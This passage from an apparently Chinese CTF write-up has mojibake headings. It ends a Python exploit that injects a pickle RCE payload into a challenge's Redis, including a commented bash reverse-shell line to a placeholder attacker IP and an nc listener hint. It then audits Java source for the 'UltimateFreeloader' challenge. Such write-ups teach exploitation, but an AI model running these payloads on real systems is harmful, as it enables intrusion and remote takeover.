operator">=</span> login<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Exploit failed - cannot login"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>            <span class="token comment"># Optional Step: Test basic code execution</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] Testing basic code execution..."</span><span class="token punctuation">)</span>    test_code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""def test():    return "RCE confirmed - Code execution successful!"test()"""</span> <span class="token comment"># &lt;-- FIX: Removed 'return' from here too</span>    result <span class="token operator">=</span> execute_python_code<span class="token punctuation">(</span>test_code<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[Result] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"RCE confirmed"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Basic RCE test failed. Aborting."</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token comment"># ==========================================================</span>    <span class="token comment"># ========= æ ¸å¿ƒåˆ©ç”¨æ­¥éª¤ï¼šæ³¨å…¥Pickle Payloadåˆ°Redis =========</span>    <span class="token comment"># ==========================================================</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Step 2: Injecting Pickle Payload into Redis for RCE"</span><span class="token punctuation">)</span>    <span class="token comment"># Configure Redis connection info</span>    redis_host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>    redis_port <span class="token operator">=</span> <span class="token number">6379</span>    redis_password <span class="token operator">=</span> <span class="token string">"Password123@redis"</span>    <span class="token comment"># Define the command you want to execute on the target server</span>    <span class="token comment"># command_to_execute = "bash -c 'bash -i >&amp; /dev/tcp/YOUR_ATTACKER_IP/YOUR_PORT 0>&amp;1'"</span>    <span class="token comment"># Or for a simple test:</span>    command_to_execute <span class="token operator">=</span> <span class="token string">"touch /tmp/pwned_by_pickle"</span>        <span class="token comment"># Call the injection function</span>    result <span class="token operator">=</span> inject_pickle_payload<span class="token punctuation">(</span>redis_host<span class="token punctuation">,</span> redis_port<span class="token punctuation">,</span> redis_password<span class="token punctuation">,</span> token<span class="token punctuation">,</span> command_to_execute<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[Injection Result] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"OK:"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Pickle payload injected successfully!"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] The next time the application deserializes this token from Redis,"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] the command '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command_to_execute<span class="token punctuation">&#125;</span></span><span class="token string">' should be executed on the server."</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] You may need to trigger this by making another authenticated request or simply waiting."</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] If using a reverse shell, make sure your listener (e.g., 'nc -lvnp YOUR_PORT') is running."</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[-] Failed to inject pickle payload."</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] You can now try to verify if the command was executed (if you used a non-interactive command)."</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] For example, checking if the file '/tmp/pwned_by_pickle' exists:"</span><span class="token punctuation">)</span>        verification_result <span class="token operator">=</span> execute_system_command<span class="token punctuation">(</span><span class="token string">"ls -l /tmp/pwned_by_pickle"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[Verification Result]\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>verification_result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] EXPLOIT FINISHED"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="è§£æ³•ä¸‰ï¼šSSRF-to-RCE"><a href="#è§£æ³•ä¸‰ï¼šSSRF-to-RCE" class="headerlink" title="è§£æ³•ä¸‰ï¼šSSRF to RCE"></a>è§£æ³•ä¸‰ï¼šSSRF to RCE</h2><hr><h1 id="UltimateFreeloaderï¼ˆå¤ç°ï¼‰"><a href="#UltimateFreeloaderï¼ˆå¤ç°ï¼‰" class="headerlink" title="UltimateFreeloaderï¼ˆå¤ç°ï¼‰"></a>UltimateFreeloaderï¼ˆå¤ç°ï¼‰</h1><p>å®¡è®¡æºç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">Result</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Coupon</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Order</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Product</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">CouponService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">OrderService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">ProductService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">UserService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">JwtUtil</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigDecimal</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">CrossOrigin</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/api/flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@CrossOrigin</span><span class="token punctuation">(</span>    origins <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlagController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">UserService</span> userService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">OrderService</span> orderService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ProductService</span> productService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">CouponService</span> couponService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">JwtUtil</span> jwtUtil<span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/get"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> token <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getTokenFromRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>jwtUtil<span class="token punctuation">.</span><span class="token function">validateToken</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> userId <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>jwtUtil<span class="token punctuation">.</span><span class="token function">getUserIdFromToken</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>userService<span class="token punctuation">.</span><span class="token function">findById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>user <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"account doesn't exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Order</span><span class="token punctuation">></span></span> userOrders <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>orderService<span class="token punctuation">.</span><span class="token function">getUserOrders</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> purchasedProductIds <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Set</span><span class="token punctuation">)</span>userOrders<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token string">"COMPLETED"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">Order</span><span class="token operator">::</span><span class="token function">getProductId</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Product</span><span class="token punctuation">></span></span> allProducts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>productService<span class="token punctuation">.</span><span class="token function">getAllProducts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> xiaotudouId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> diguaId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> yuId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> datudouId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Product</span> product <span class="token operator">:</span> allProducts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Little Potato"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>product<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        xiaotudouId <span class="token operator">=</span> product<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Sweet Potato"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>product<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        diguaId <span class="token operator">=</span> product<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Fish Fish"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>product<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        yuId <span class="token operator">=</span> product<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Large Potato"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>product<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        datudouId <span class="token operator">=</span> product<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>xiaotudouId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> diguaId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> yuId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> datudouId <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>xiaotudouId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"little potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>diguaId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"sweet potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>yuId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"fish needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>datudouId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"large potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"your balance is lower than 10~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Coupon</span><span class="token punctuation">></span></span> userCoupons <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>couponService<span class="token punctuation">.</span><span class="token function">getUserCoupons</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">boolean</span> hasUnusedCoupon <span class="token operator">=</span> userCoupons<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anyMatch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>coupon<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token operator">!</span>coupon<span class="token punctuation">.</span><span class="token function">getIsUsed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasUnusedCoupon<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"you cannot use your coupon~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token string">"Ultimate Freeloader! ï¼"</span><span class="token punctuation">,</span> <span class="token string">"RCTF&#123;test_flag&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">,</span> <span class="token string">"unauthorized"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">getTokenFromRequest</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> bearerToken <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bearerToken <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> bearerToken<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"Bearer "</span><span class="token punctuation">)</span> <span class="token operator">?</span> bearerToken<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·å– flag çš„æ¡ä»¶ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>xiaotudouId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> diguaId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> yuId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> datudouId 